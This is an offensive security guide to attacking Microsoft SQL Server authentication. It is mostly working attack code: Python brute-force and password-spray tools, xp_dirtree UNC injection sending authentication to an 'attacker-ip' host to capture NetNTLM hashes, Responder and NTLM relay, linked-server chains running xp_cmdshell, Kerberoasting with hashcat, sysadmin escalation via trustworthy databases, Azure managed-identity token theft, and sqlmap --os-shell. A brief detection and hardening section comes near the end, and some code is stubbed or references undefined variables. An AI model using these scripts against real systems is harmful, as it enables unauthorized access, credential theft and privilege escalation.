# MSSQL Authentication Attacks

## ELI5: The Database Kingdom's Broken Gates

Imagine a massive library (SQL Server) that contains all the kingdom's secrets - citizen records, financial data, military plans. This library has multiple doors (authentication methods) and various librarians (service accounts) who can access different sections. We're learning how to:
- Find secret entrances the architects forgot about
- Steal librarian keycards to access restricted sections
- Exploit the trust between different libraries in the kingdom
- Use one library card to access the entire library network

## Table of Contents
1. [MSSQL Authentication Architecture](#mssql-authentication-architecture)
2. [Service Discovery and Enumeration](#service-discovery-and-enumeration)
3. [Authentication Attack Vectors](#authentication-attack-vectors)
4. [UNC Path Injection](#unc-path-injection)
5. [Linked Server Exploitation](#linked-server-exploitation)
6. [Kerberos Authentication Attacks](#kerberos-authentication-attacks)
7. [Practical Attack Scenarios](#practical-attack-scenarios)

## MSSQL Authentication Architecture

### Authentication Modes

#### Windows Authentication Mode
```sql
-- Windows authentication (trusted connection)
-- Like using your castle ID card everywhere
sqlcmd -S SERVER\INSTANCE -E
impacket-mssqlclient DOMAIN/user:password@target -windows-auth

-- Service Principal Names (SPNs)
setspn -T domain -Q MSSQLSvc/*
```

#### Mixed Mode Authentication
```sql
-- SQL Server authentication
-- Like having a separate library card
sqlcmd -S SERVER -U sa -P password
impacket-mssqlclient sa:password@target

-- Check authentication mode
SELECT SERVERPROPERTY('IsIntegratedSecurityOnly')
-- 0 = Mixed mode, 1 = Windows only
```

### Default Accounts and Passwords

#### Common Default Credentials
```python
#!/usr/bin/env python3
# mssql_default_creds.py - Test default credentials

import pymssql

default_creds = [
    ('sa', ''),
    ('sa', 'sa'),
    ('sa', 'password'),
    ('sa', 'Password123'),
    ('sa', 'SQLPassword'),
    ('BUILTIN\\Administrators', ''),
    ('NT AUTHORITY\\SYSTEM', ''),
    ('.\SQLExpress', '')
]

def test_credentials(server, creds_list):
    """Test default MSSQL credentials"""
    for username, password in creds_list:
        try:
            conn = pymssql.connect(
                server=server,
                user=username,
                password=password,
                login_timeout=3
            )
            print(f"[+] Success: {username}:{password}")
            conn.close()
            return True
        except:
            print(f"[-] Failed: {username}:{password}")
    return False

# Application-specific defaults
app_defaults = {
    'Umbraco': ('sa', 'umbracopassword'),
    'DNN': ('sa', 'dnnsqlpassword'),
    'SharePoint': ('sa', 'SharePoint2013'),
    'vCenter': ('vpx', 'vpxpassword')
}
```

## Service Discovery and Enumeration

### UDP Broadcast Discovery

#### SQL Browser Service (UDP 1434)
```python
#!/usr/bin/env python3
# mssql_discover.py - Discover MSSQL instances via UDP

import socket
import struct

def discover_mssql_instances(target_network):
    """Discover MSSQL instances via SQL Browser"""
    CLNT_BCAST_EX = b'\x02'
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(3)

    try:
        # Send discovery packet
        sock.sendto(CLNT_BCAST_EX, (target_network, 1434))

        # Parse responses
        while True:
            try:
                data, addr = sock.recvfrom(65536)
                # Parse instance information
                parse_sql_browser_response(data, addr[0])
            except socket.timeout:
                break
    finally:
        sock.close()

def parse_sql_browser_response(data, server_ip):
    """Parse SQL Browser response"""
    # Skip first 3 bytes
    info = data[3:].decode('utf-16-le', errors='ignore')

    # Parse key-value pairs
    instances = {}
    parts = info.split(';')
    for i in range(0, len(parts)-1, 2):
        key = parts[i]
        value = parts[i+1] if i+1 < len(parts) else ''

        if key == 'ServerName':
            print(f"\n[+] Server: {value} ({server_ip})")
        elif key == 'InstanceName':
            print(f"    Instance: {value}")
        elif key == 'tcp':
            print(f"    TCP Port: {value}")
        elif key == 'Version':
            print(f"    Version: {value}")
```

### SPN Discovery

#### PowerShell SPN Enumeration
```powershell
# Find MSSQL SPNs in domain
# Like finding all library entrance badges
function Find-MSSQLServers {
    $search = New-Object DirectoryServices.DirectorySearcher
    $search.Filter = "(servicePrincipalName=MSSQLSvc/*)"
    $search.PropertiesToLoad.Add("serviceprincipalname") | Out-Null
    $search.PropertiesToLoad.Add("samaccountname") | Out-Null

    $results = $search.FindAll()
    foreach ($result in $results) {
        $spn = $result.Properties["serviceprincipalname"]
        $account = $result.Properties["samaccountname"]

        foreach ($s in $spn) {
            if ($s -match "MSSQLSvc/([^:]+):?(\d+)?") {
                [PSCustomObject]@{
                    Server = $matches[1]
                    Port = if ($matches[2]) { $matches[2] } else { "1433" }
                    SPN = $s
                    Account = $account
                }
            }
        }
    }
}

# Enumerate with PowerUpSQL
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain -Verbose
Get-SQLInstanceLocal -Verbose
Get-SQLInstanceScanUDP -ComputerName 192.168.1.0/24
```

## Authentication Attack Vectors

### Brute Force Attacks

#### Multi-threaded Brute Forcer
```python
#!/usr/bin/env python3
# mssql_brute.py - Multi-threaded MSSQL brute forcer

import threading
import queue
import pymssql
from time import sleep

class MSSQLBruteForcer:
    """Multi-threaded MSSQL brute force tool"""

    def __init__(self, target, port=1433, threads=10):
        self.target = target
        self.port = port
        self.threads = threads
        self.queue = queue.Queue()
        self.found = threading.Event()
        self.lock = threading.Lock()

    def worker(self):
        """Brute force worker thread"""
        while not self.found.is_set():
            try:
                username, password = self.queue.get(timeout=1)
                if self.try_login(username, password):
                    with self.lock:
                        print(f"[+] FOUND: {username}:{password}")
                        self.found.set()
                self.queue.task_done()
            except queue.Empty:
                break

    def try_login(self, username, password):
        """Attempt MSSQL login"""
        try:
            conn = pymssql.connect(
                server=f"{self.target}:{self.port}",
                user=username,
                password=password,
                login_timeout=3,
                charset='UTF-8'
            )
            conn.close()
            return True
        except pymssql.OperationalError as e:
            if "Login failed" in str(e):
                return False
            # Handle rate limiting
            if "too many failed" in str(e).lower():
                sleep(30)
            return False
        except:
            return False

    def run(self, userlist, passlist):
        """Run brute force attack"""
        # Load credentials into queue
        with open(userlist) as uf:
            users = [u.strip() for u in uf]
        with open(passlist) as pf:
            passwords = [p.strip() for p in pf]

        for user in users:
            for password in passwords:
                self.queue.put((user, password))

        # Start worker threads
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)

        # Wait for completion
        self.queue.join()
        for t in threads:
            t.join()

# Smart password generation
def generate_passwords(base_words, years=[2020,2021,2022,2023,2024]):
    """Generate common password patterns"""
    passwords = []
    special_chars = ['!', '@', '#', '$', '123', '1']

    for word in base_words:
        passwords.append(word)
        passwords.append(word.capitalize())

        # Add years
        for year in years:
            passwords.append(f"{word}{year}")
            passwords.append(f"{word.capitalize()}{year}")

        # Add special characters
        for char in special_chars:
            passwords.append(f"{word}{char}")
            passwords.append(f"{word.capitalize()}{char}")

    return passwords
```

### Dictionary Attack with Spray

#### Password Spraying
```python
#!/usr/bin/env python3
# mssql_spray.py - Password spray against MSSQL

import time
from datetime import datetime, timedelta

class MSSQLSpray:
    """MSSQL password spray tool"""

    def __init__(self, targets, delay=30):
        self.targets = targets
        self.delay = delay  # Delay between attempts
        self.lockout_threshold = 3  # Typical lockout threshold
        self.lockout_duration = 30  # Minutes

    def spray(self, username, passwords):
        """Spray passwords across targets"""
        for password in passwords:
            print(f"\n[*] Spraying {username}:{password}")

            for target in self.targets:
                result = self.try_auth(target, username, password)
                if result:
                    self.log_success(target, username, password)

            # Respect lockout policy
            if len(passwords) > 1:
                print(f"[*] Waiting {self.delay}s to avoid lockout...")
                time.sleep(self.delay)

    def try_auth(self, target, username, password):
        """Single authentication attempt"""
        try:
            # Use Windows auth if domain user
            if '\\' in username or '@' in username:
                cmd = f"crackmapexec mssql {target} -u '{username}' -p '{password}' --local-auth"
            else:
                cmd = f"crackmapexec mssql {target} -u '{username}' -p '{password}'"

            # Would execute and parse results
            return self.execute_auth(cmd)
        except:
            return False

    def smart_spray(self, users, passwords):
        """Smart spray respecting lockout policies"""
        attempts_per_user = {}

        for password in passwords:
            for user in users:
                # Track attempts per user
                if user not in attempts_per_user:
                    attempts_per_user[user] = {
                        'count': 0,
                        'last_attempt': datetime.now()
                    }

                # Check if we should wait
                user_info = attempts_per_user[user]
                if user_info['count'] >= self.lockout_threshold - 1:
                    time_since = datetime.now() - user_info['last_attempt']
                    if time_since < timedelta(minutes=self.lockout_duration):
                        wait_time = self.lockout_duration * 60 - time_since.seconds
                        print(f"[!] Waiting {wait_time}s for {user} lockout window")
                        time.sleep(wait_time)
                    user_info['count'] = 0

                # Attempt authentication
                for target in self.targets:
                    if self.try_auth(target, user, password):
                        print(f"[+] SUCCESS: {target} - {user}:{password}")

                user_info['count'] += 1
                user_info['last_attempt'] = datetime.now()
```

## UNC Path Injection

### Stealing NetNTLM Hashes

#### XP_DIRTREE Hash Capture
```sql
-- Force MSSQL to authenticate to attacker
-- Like tricking the librarian to show their keycard
EXEC master.sys.xp_dirtree '\\attacker-ip\share'
EXEC master.sys.xp_fileexist '\\attacker-ip\share\file'

-- Alternative methods
EXEC xp_subdirs '\\attacker-ip\share'
EXEC xp_cmdshell 'dir \\attacker-ip\share'

-- Via linked server
EXEC ('xp_dirtree ''\\attacker-ip\share''') AT LinkedServer

-- In stored procedure
CREATE PROCEDURE sp_getfiles
AS
BEGIN
    EXEC xp_dirtree '\\attacker-ip\share'
END
```

#### Responder Integration
```python
#!/usr/bin/env python3
# mssql_hash_capture.py - Capture MSSQL service hashes

import subprocess
import threading
import pymssql

class HashCapture:
    """MSSQL hash capture via UNC injection"""

    def __init__(self, listener_ip):
        self.listener_ip = listener_ip
        self.responder_proc = None

    def start_responder(self):
        """Start Responder listener"""
        cmd = [
            'responder',
            '-I', 'eth0',
            '-w', '-r', '-f',
            '--lm'  # Downgrade for better cracking
        ]
        self.responder_proc = subprocess.Popen(cmd)
        print(f"[+] Responder listening on {self.listener_ip}")

    def trigger_auth(self, target, username, password):
        """Trigger authentication via UNC path"""
        try:
            conn = pymssql.connect(
                server=target,
                user=username,
                password=password
            )
            cursor = conn.cursor()

            # Multiple UNC injection points
            payloads = [
                f"EXEC xp_dirtree '\\\\{self.listener_ip}\\share'",
                f"EXEC xp_fileexist '\\\\{self.listener_ip}\\file'",
                f"BACKUP DATABASE master TO DISK='\\\\{self.listener_ip}\\backup.bak'"
            ]

            for payload in payloads:
                try:
                    print(f"[*] Executing: {payload}")
                    cursor.execute(payload)
                except:
                    pass  # Some may fail due to permissions

            conn.close()
            print("[+] UNC injection completed")

        except Exception as e:
            print(f"[-] Failed: {e}")

    def relay_attack(self, target_db):
        """Relay captured credentials"""
        cmd = f"ntlmrelayx.py -t mssql://{target_db} -smb2support"
        subprocess.run(cmd, shell=True)
```

## Linked Server Exploitation

### Discovering Linked Servers

#### Enumeration Queries
```sql
-- Find linked servers
-- Like finding tunnels between libraries
SELECT * FROM sys.servers WHERE is_linked = 1

-- Get detailed configuration
SELECT
    s.name AS LinkedServer,
    s.provider,
    s.data_source,
    s.is_remote_login_enabled,
    s.is_rpc_out_enabled,
    l.remote_name
FROM sys.servers s
LEFT JOIN sys.linked_logins l ON s.server_id = l.server_id
WHERE s.is_linked = 1

-- Test connectivity
EXEC sp_testlinkedserver 'LinkedServerName'

-- Get server version through link
SELECT * FROM OPENQUERY(LinkedServer, 'SELECT @@version')
```

#### Chain Exploitation
```python
#!/usr/bin/env python3
# linked_server_chain.py - Exploit linked server chains

import pymssql

class LinkedServerExploit:
    """Exploit MSSQL linked server chains"""

    def __init__(self, initial_server, creds):
        self.servers = {initial_server: creds}
        self.chain = [initial_server]
        self.visited = set()

    def discover_links(self, server, creds):
        """Discover linked servers recursively"""
        if server in self.visited:
            return

        self.visited.add(server)

        try:
            conn = pymssql.connect(
                server=server,
                user=creds['user'],
                password=creds['pass']
            )
            cursor = conn.cursor()

            # Find linked servers
            cursor.execute("""
                SELECT name, provider, data_source
                FROM sys.servers
                WHERE is_linked = 1
            """)

            for row in cursor:
                linked_name = row[0]
                print(f"[+] Found link: {server} -> {linked_name}")

                # Test if we can execute commands
                if self.test_execution(cursor, linked_name):
                    self.chain.append(linked_name)
                    # Recurse through chain
                    self.discover_links_via_chain(linked_name)

            conn.close()

        except Exception as e:
            print(f"[-] Error on {server}: {e}")

    def test_execution(self, cursor, linked_server):
        """Test command execution on linked server"""
        try:
            # Test basic query
            query = f"SELECT * FROM OPENQUERY([{linked_server}], 'SELECT @@version')"
            cursor.execute(query)
            return True
        except:
            return False

    def execute_through_chain(self, command):
        """Execute command through linked server chain"""
        # Build nested OPENQUERY statements
        exec_cmd = f"EXEC xp_cmdshell '{command}'"

        # Wrap for each link in chain (reverse order)
        for server in reversed(self.chain[1:]):
            exec_cmd = f"SELECT * FROM OPENQUERY([{server}], '{exec_cmd}')"

        return exec_cmd

    def escalate_privileges(self):
        """Attempt privilege escalation through links"""
        for i, server in enumerate(self.chain):
            # Check current privileges
            check_admin = self.build_chain_query(i,
                "SELECT IS_SRVROLEMEMBER('sysadmin')")

            # Check if we can enable xp_cmdshell
            enable_cmd = self.build_chain_query(i, """
                EXEC sp_configure 'show advanced options', 1;
                RECONFIGURE;
                EXEC sp_configure 'xp_cmdshell', 1;
                RECONFIGURE;
            """)

            print(f"[*] Attempting escalation on {server}")
            # Execute privilege checks and escalation
```

### Double Link Execution

#### Advanced Chain Queries
```sql
-- Execute through multiple links
-- Like bouncing through multiple libraries
EXEC ('EXEC (''SELECT @@version'') AT SQL2') AT SQL1

-- Triple link execution
EXEC ('EXEC (''EXEC (''''SELECT * FROM secrets'''') AT SQL3'') AT SQL2') AT SQL1

-- Enable xp_cmdshell through chain
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE') AT LinkedServer
EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT LinkedServer

-- Execute OS commands through chain
EXEC ('EXEC xp_cmdshell ''whoami''') AT LinkedServer
```

## Kerberos Authentication Attacks

### Kerberoasting MSSQL

#### SPN Extraction and Cracking
```python
#!/usr/bin/env python3
# mssql_kerberoast.py - Kerberoast MSSQL services

from impacket.krb5.types import Principal
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.asn1 import AP_REQ, Authenticator
import hashlib

class MSSQLKerberoast:
    """Kerberoast MSSQL service accounts"""

    def __init__(self, domain, dc_ip):
        self.domain = domain
        self.dc_ip = dc_ip
        self.tgt = None

    def get_mssql_spns(self):
        """Enumerate MSSQL SPNs"""
        from ldap3 import Server, Connection, ALL

        server = Server(self.dc_ip, get_info=ALL)
        conn = Connection(server, auto_bind=True)

        # Search for MSSQL SPNs
        conn.search(
            search_base=f'DC={self.domain.replace(".", ",DC=")}',
            search_filter='(&(servicePrincipalName=MSSQLSvc/*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
            attributes=['servicePrincipalName', 'sAMAccountName', 'pwdLastSet']
        )

        spns = []
        for entry in conn.entries:
            for spn in entry.servicePrincipalName:
                if 'MSSQLSvc' in spn:
                    spns.append({
                        'spn': str(spn),
                        'account': str(entry.sAMAccountName),
                        'pwdLastSet': str(entry.pwdLastSet)
                    })

        return spns

    def request_tgs(self, spn, username, password):
        """Request TGS for MSSQL SPN"""
        # Get TGT first
        client = Principal(username, type=1)
        tgt, cipher, key = getKerberosTGT(
            client, password, self.domain,
            lmhash='', nthash='',
            kdcHost=self.dc_ip
        )

        # Request TGS for MSSQL service
        server = Principal(spn, type=2)
        tgs, cipher, key = getKerberosTGS(
            server, self.domain,
            kdcHost=self.dc_ip,
            tgt=tgt, cipher=cipher,
            sessionKey=key
        )

        return self.format_hash(tgs, spn)

    def format_hash(self, tgs, spn):
        """Format TGS for hashcat/john"""
        # Extract encrypted part
        # This would extract and format the actual ticket
        hash_format = f"$krb5tgs$23$*{spn}$*${tgs_encrypted_part}"
        return hash_format

    def kerberoast_all(self, username, password):
        """Kerberoast all MSSQL SPNs"""
        spns = self.get_mssql_spns()
        hashes = []

        for spn_info in spns:
            spn = spn_info['spn']
            print(f"[*] Requesting TGS for {spn}")

            try:
                hash = self.request_tgs(spn, username, password)
                hashes.append(hash)
                print(f"[+] Got hash for {spn_info['account']}")

                # Check password age for prioritization
                print(f"    Password last set: {spn_info['pwdLastSet']}")

            except Exception as e:
                print(f"[-] Failed for {spn}: {e}")

        return hashes

# Crack with hashcat
def crack_hashes(hashfile):
    """Crack Kerberoasted hashes"""
    import subprocess

    # Common MSSQL service account passwords
    wordlist = """SQLservice
MSSQLsvc123
DatabaseAdmin2023
SqlServer!
P@ssw0rd123
ServiceAccount1
SQL2019Admin"""

    with open('mssql_wordlist.txt', 'w') as f:
        f.write(wordlist)

    # Hashcat command
    cmd = [
        'hashcat',
        '-m', '13100',  # Kerberos 5 TGS-REP
        '-a', '0',      # Dictionary attack
        hashfile,
        'mssql_wordlist.txt',
        '--force'
    ]

    subprocess.run(cmd)
```

## Practical Attack Scenarios

### Scenario 1: External to Domain Admin

```python
#!/usr/bin/env python3
# mssql_kill_chain.py - Complete MSSQL attack chain

class MSSQLKillChain:
    """Complete MSSQL exploitation chain"""

    def __init__(self, target):
        self.target = target
        self.creds = None
        self.is_sysadmin = False

    def phase1_discovery(self):
        """Initial discovery phase"""
        print("[Phase 1] Discovery")

        # 1. UDP broadcast for instances
        instances = self.udp_discover()

        # 2. TCP port scan for default ports
        ports = [1433, 1434, 2433, 3433]
        open_ports = self.tcp_scan(ports)

        # 3. Check for web interfaces
        web_ports = [80, 443, 8080, 8443]
        web_services = self.check_web_sql(web_ports)

        return instances + open_ports + web_services

    def phase2_authentication(self, targets):
        """Authentication attacks"""
        print("[Phase 2] Authentication")

        # 1. Try default credentials
        for target in targets:
            if self.try_defaults(target):
                break

        # 2. Password spray common passwords
        if not self.creds:
            self.password_spray(targets)

        # 3. Try UNC path injection for hashes
        if not self.creds:
            self.capture_hashes(targets)

        return self.creds is not None

    def phase3_privilege_escalation(self):
        """Escalate to sysadmin"""
        print("[Phase 3] Privilege Escalation")

        # 1. Check current privileges
        if self.check_sysadmin():
            return True

        # 2. Try impersonation
        if self.try_impersonation():
            return True

        # 3. Exploit linked servers
        if self.exploit_linked_servers():
            return True

        # 4. UDF injection
        if self.inject_udf():
            return True

        return False

    def phase4_post_exploitation(self):
        """Post-exploitation activities"""
        print("[Phase 4] Post-Exploitation")

        # 1. Enable xp_cmdshell
        self.enable_xp_cmdshell()

        # 2. Dump credentials
        creds = self.dump_credentials()

        # 3. Establish persistence
        self.create_persistence()

        # 4. Lateral movement
        self.lateral_movement(creds)

        # 5. Data exfiltration
        self.exfiltrate_data()

    def execute_chain(self):
        """Execute complete kill chain"""
        print("[*] Starting MSSQL Kill Chain")

        # Discovery
        targets = self.phase1_discovery()
        if not targets:
            print("[-] No MSSQL servers found")
            return

        # Authentication
        if not self.phase2_authentication(targets):
            print("[-] Authentication failed")
            return

        # Privilege Escalation
        if not self.phase3_privilege_escalation():
            print("[!] Operating with limited privileges")

        # Post-exploitation
        self.phase4_post_exploitation()

        print("[+] Kill chain completed")
```

### Scenario 2: Insider Threat Simulation

```sql
-- Insider with read access escalating privileges
-- Like a junior librarian becoming head librarian

-- Step 1: Enumerate current permissions
SELECT * FROM fn_my_permissions(NULL, 'SERVER')
SELECT * FROM fn_my_permissions(NULL, 'DATABASE')

-- Step 2: Find stored procedures we can execute
SELECT
    p.name,
    m.definition,
    p.create_date,
    p.modify_date
FROM sys.procedures p
JOIN sys.sql_modules m ON p.object_id = m.object_id
WHERE HAS_PERMS_BY_NAME(p.name, 'OBJECT', 'EXECUTE') = 1

-- Step 3: Look for SQL injection in stored procs
-- Find procedures with dynamic SQL
SELECT
    OBJECT_NAME(object_id) AS ProcName,
    definition
FROM sys.sql_modules
WHERE definition LIKE '%EXEC(%'
   OR definition LIKE '%sp_executesql%'

-- Step 4: Exploit trustworthy database
USE msdb  -- Often marked as trustworthy
GO
CREATE PROCEDURE sp_escalate
WITH EXECUTE AS OWNER
AS
BEGIN
    EXEC sp_addsrvrolemember 'domain\user', 'sysadmin'
END
GO
EXEC sp_escalate

-- Step 5: Certificate signing exploitation
-- Create certificate signed procedure
CREATE CERTIFICATE EscalateCert
    ENCRYPTION BY PASSWORD = 'P@ssw0rd'
    WITH SUBJECT = 'Escalation Certificate'

CREATE PROCEDURE sp_escalate_cert
AS
BEGIN
    ALTER SERVER ROLE sysadmin ADD MEMBER [domain\user]
END

ADD SIGNATURE TO sp_escalate_cert
    BY CERTIFICATE EscalateCert
    WITH PASSWORD = 'P@ssw0rd'
```

### Scenario 3: Cloud Database Attacks

```python
#!/usr/bin/env python3
# azure_sql_attack.py - Attack Azure SQL databases

import requests
import json
import base64

class AzureSQLAttack:
    """Attack Azure SQL Database instances"""

    def __init__(self, tenant_id):
        self.tenant_id = tenant_id
        self.access_token = None

    def enumerate_databases(self, subscription_id):
        """Enumerate Azure SQL databases"""
        # Using Azure Resource Manager API
        url = f"https://management.azure.com/subscriptions/{subscription_id}/providers/Microsoft.Sql/servers"

        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        response = requests.get(url, headers=headers)
        servers = response.json()

        databases = []
        for server in servers.get('value', []):
            server_name = server['name']
            # Get databases for each server
            db_url = f"{server['id']}/databases"
            db_response = requests.get(db_url, headers=headers)

            for db in db_response.json().get('value', []):
                databases.append({
                    'server': server_name,
                    'database': db['name'],
                    'location': db['location'],
                    'tier': db.get('sku', {}).get('tier')
                })

        return databases

    def firewall_bypass(self, server_name):
        """Attempt to bypass IP firewall rules"""
        # Common Azure service IPs that might be whitelisted
        azure_ips = [
            '168.63.129.16',  # Azure metadata service
            '169.254.169.254', # Instance metadata
        ]

        # Try connection from different source IPs
        for ip in azure_ips:
            # Would attempt connection spoofing source IP
            pass

    def steal_connection_strings(self):
        """Extract connection strings from Azure resources"""
        # Check Key Vault for connection strings
        kv_url = "https://vault.azure.net/secrets"

        # Check App Service configuration
        app_config_url = "https://management.azure.com/subscriptions/{}/providers/Microsoft.Web/sites"

        # Check Function App settings
        func_url = "https://management.azure.com/subscriptions/{}/providers/Microsoft.Web/sites?api-version=2021-02-01"

        connection_strings = []
        # Would enumerate and extract connection strings
        return connection_strings

    def managed_identity_abuse(self):
        """Abuse managed identity for database access"""
        # Get token using managed identity
        url = "http://169.254.169.254/metadata/identity/oauth2/token"
        params = {
            'api-version': '2018-02-01',
            'resource': 'https://database.windows.net/'
        }
        headers = {'Metadata': 'true'}

        response = requests.get(url, params=params, headers=headers)
        token = response.json()['access_token']

        # Use token to connect to Azure SQL
        import pyodbc
        connection_string = (
            'Driver={ODBC Driver 17 for SQL Server};'
            'Server=server.database.windows.net;'
            'Database=mydb;'
            'Authentication=ActiveDirectoryMsi'
        )

        conn = pyodbc.connect(connection_string)
        return conn
```

## Defense and Detection

### Detecting Authentication Attacks

```sql
-- Monitor failed login attempts
-- Like security cameras at library entrances
SELECT
    event_time,
    action_id,
    succeeded,
    client_ip,
    application_name,
    additional_information
FROM sys.fn_get_audit_file('C:\SQLAudit\*.sqlaudit', DEFAULT, DEFAULT)
WHERE action_id = 'LGIF'  -- Login failed
  AND event_time > DATEADD(hour, -24, GETDATE())
ORDER BY event_time DESC

-- Detect brute force patterns
WITH LoginAttempts AS (
    SELECT
        server_principal_name,
        client_ip,
        COUNT(*) as attempt_count,
        MIN(event_time) as first_attempt,
        MAX(event_time) as last_attempt
    FROM sys.fn_get_audit_file('C:\SQLAudit\*.sqlaudit', DEFAULT, DEFAULT)
    WHERE action_id = 'LGIF'
      AND event_time > DATEADD(hour, -1, GETDATE())
    GROUP BY server_principal_name, client_ip
)
SELECT * FROM LoginAttempts
WHERE attempt_count > 5  -- Threshold for alerting
ORDER BY attempt_count DESC

-- Monitor UNC path usage (hash stealing attempts)
CREATE EVENT SESSION [UNC_Monitor] ON SERVER
ADD EVENT sqlserver.error_reported(
    WHERE ([message] LIKE '%UNC%' OR [message] LIKE '%\\\\%'))
ADD TARGET package0.event_file(
    SET filename='C:\SQLAudit\UNC_Monitor.xel')
WITH (STARTUP_STATE=ON)
```

### Hardening Measures

```powershell
# MSSQL hardening script
# Like installing better locks and alarms

# 1. Disable unnecessary features
Invoke-Sqlcmd -Query "
    EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
    EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;
    EXEC sp_configure 'CLR enabled', 0; RECONFIGURE;
"

# 2. Remove sample databases
Invoke-Sqlcmd -Query "
    IF EXISTS(SELECT * FROM sys.databases WHERE name = 'AdventureWorks')
        DROP DATABASE AdventureWorks;
    IF EXISTS(SELECT * FROM sys.databases WHERE name = 'pubs')
        DROP DATABASE pubs;
"

# 3. Implement login auditing
Invoke-Sqlcmd -Query "
    CREATE SERVER AUDIT LoginAudit
    TO FILE (FILEPATH = 'C:\SQLAudit\', MAXSIZE = 100 MB)
    WITH (QUEUE_DELAY = 1000, ON_FAILURE = CONTINUE);

    CREATE SERVER AUDIT SPECIFICATION LoginAuditSpec
    FOR SERVER AUDIT LoginAudit
    ADD (FAILED_LOGIN_GROUP),
    ADD (SUCCESSFUL_LOGIN_GROUP),
    ADD (LOGIN_CHANGE_PASSWORD_GROUP);

    ALTER SERVER AUDIT LoginAudit WITH (STATE = ON);
"

# 4. Set strong password policy
$sqlPolicy = @"
    ALTER LOGIN [sa] WITH PASSWORD = 'ComplexP@ssw0rd123!@#'
    ALTER LOGIN [sa] WITH CHECK_POLICY = ON
    ALTER LOGIN [sa] WITH CHECK_EXPIRATION = ON
"@
```

## Tool Integration Examples

### Metasploit Modules
```ruby
# mssql_enum module usage
use auxiliary/scanner/mssql/mssql_enum
set RHOSTS 192.168.1.0/24
set THREADS 10
run

# mssql_login module
use auxiliary/scanner/mssql/mssql_login
set RHOSTS target.com
set USER_FILE users.txt
set PASS_FILE passwords.txt
set BRUTEFORCE_SPEED 5
run

# mssql_escalate_execute_as
use auxiliary/admin/mssql/mssql_escalate_execute_as
set RHOST target.com
set USERNAME sa
set PASSWORD password
run
```

### SQLMap Automation
```bash
# Enumerate databases via SQL injection
sqlmap -u "http://target/page.asp?id=1" --dbms=mssql --dbs

# Dump credentials
sqlmap -u "http://target/page.asp?id=1" --dbms=mssql -D master --dump

# Execute OS commands
sqlmap -u "http://target/page.asp?id=1" --dbms=mssql --os-shell

# Privilege escalation via SQLMap
sqlmap -u "http://target/page.asp?id=1" --dbms=mssql --priv-esc
```

This comprehensive guide covers MSSQL authentication attacks from discovery through exploitation, with practical code examples and clear explanations suitable for both beginners and advanced practitioners.